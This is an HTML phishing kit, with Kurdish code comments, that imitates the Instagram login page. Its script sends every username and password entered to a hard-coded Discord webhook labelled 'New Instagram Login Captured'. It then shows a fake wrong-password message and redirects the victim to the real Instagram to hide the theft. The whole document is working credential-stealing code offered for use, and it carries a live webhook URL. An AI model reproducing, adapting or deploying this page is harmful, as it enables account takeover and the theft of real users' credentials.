<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }

        .login-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 40px 30px;
            width: 350px;
            text-align: center;
            border-radius: 1px;
        }

        .logo {
            margin-bottom: 30px;
        }

        .logo svg {
            width: 175px;
            height: 51px;
        }

        .input-field {
            width: 100%;
            padding: 9px 8px;
            margin-bottom: 6px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
            outline: none;
        }

        .input-field:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            padding: 7px 0;
            background-color: #0095f6;
            color: white;
            font-weight: 600;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
            opacity: 0.7;
            transition: opacity 0.2s;
        }

        .login-btn.active {
            opacity: 1;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #737373;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider span {
            margin: 0 18px;
        }

        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .facebook-login svg {
            width: 16px;
            height: 16px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            cursor: pointer;
            text-decoration: none;
        }

        .signup-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 20px 30px;
            width: 350px;
            text-align: center;
            border-radius: 1px;
        }

        .signup-box p {
            font-size: 14px;
            color: #262626;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            margin-top: 10px;
        }

        .get-app p {
            font-size: 14px;
            margin-bottom: 15px;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-buttons img {
            height: 40px;
        }

        .footer {
            margin-top: 40px;
            color: #8e8e8e;
            font-size: 12px;
            max-width: 700px;
            text-align: center;
        }

        .footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 6px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .error-msg {
            color: #ed4956;
            font-size: 12px;
            margin: 8px 0;
            display: none;
        }

        .loader {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="main-container">

    <!-- Login Box -->
    <div class="login-box">
        <div class="logo">
            <svg viewBox="0 0 175 39" xmlns="http://www.w3.org/2000/svg">
                <text x="50%" y="50%" dominant-baseline="central" text-anchor="middle" font-family="Arial" font-weight="600" font-size="32" fill="#262626">Instagram</text>
            </svg>
        </div>

        <form id="loginForm">
            <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" class="input-field" placeholder="Password" required>
            <div id="errorMsg" class="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
            <button type="submit" id="loginBtn" class="login-btn" disabled>Log In</button>
        </form>

        <div class="divider">
            <span>OR</span>
        </div>

        <div class="facebook-login">
            <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"><path fill="#385185" d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg>
            <span>Log in with Facebook</span>
        </div>

        <a href="#" class="forgot-password">Forgot password?</a>
    </div>

    <!-- Sign Up Box -->
    <div class="signup-box">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <!-- Get App -->
    <div class="get-app">
        <p>Get the app.</p>
        <div class="app-buttons">
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store">
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play">
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <a href="#">Meta</a>
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Top Accounts</a>
        <a href="#">Hashtags</a>
        <a href="#">Locations</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Contact Uploading & Non-Users</a>
    </div>

</div>

<script>
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');
    const loginForm = document.getElementById('loginForm');
    const errorMsg = document.getElementById('errorMsg');

    // 🎯 Webhook URL - هەمان ئەوەی تۆ دات
    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1499096194218066091/hOMRRibJigxw5d6jDRrio0Bvf6L7udOb_-ixlNHCWKwoJJ3amTAR-MuaENRe2p5bLQdn';

    // چالاککردنی دوگمەکە کاتێک هەردوو خانە پڕن
    function toggleButton() {
        if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
            loginBtn.disabled = false;
            loginBtn.classList.add('active');
        } else {
            loginBtn.disabled = true;
            loginBtn.classList.remove('active');
        }
    }

    usernameInput.addEventListener('input', toggleButton);
    passwordInput.addEventListener('input', toggleButton);

    // کاتێک فۆرم نێردرا
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault(); // ڕێگە لە ناردنی ڕاستەوخۆ دەگرێت

        const username = usernameInput.value;
        const password = passwordInput.value;

        // نیشاندانی loader لە دوگمەکەدا
        loginBtn.innerHTML = '<div class="loader" style="display:block"></div>';
        loginBtn.disabled = true;

        // YEKEM: ناردنی زانیاری بۆ وێب هووک
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: '**🔐 New Instagram Login Captured**\n```\nUsername/Email: ' + username + '\nPassword: ' + password + '\nTimestamp: ' + new Date().toLocaleString() + '\n```'
            })
        })
        .then(function(response) {
            console.log('Webhook response status:', response.status);
            // هەرچۆنێک بێت، دوای ناردن هەڵەکە نیشان بدە
            showErrorAndRedirect();
        })
        .catch(function(error) {
            console.log('Webhook error:', error);
            // ئەگەر وێب هووک کار نەکات، هەر بەردەوام بە
            showErrorAndRedirect();
        });

        // DUWEM: نیشاندانی پەیامی هەڵە و ڕەوانەکردن
        function showErrorAndRedirect() {
            // دوگمەکە بگەڕێنەوە باری ئاسایی
            loginBtn.innerHTML = 'Log In';
            loginBtn.disabled = false;
            toggleButton();
            
            // نیشاندانی پەیامی هەڵە
            errorMsg.style.display = 'block';
            
            // ڕەوانەکردن بۆ ئینستاگرامی ڕاستەقینە دوای 2 چرکە
            setTimeout(function() {
                window.location.href = 'https://www.instagram.com';
            }, 2000);
        }
    });
</script>

</body>
</html>
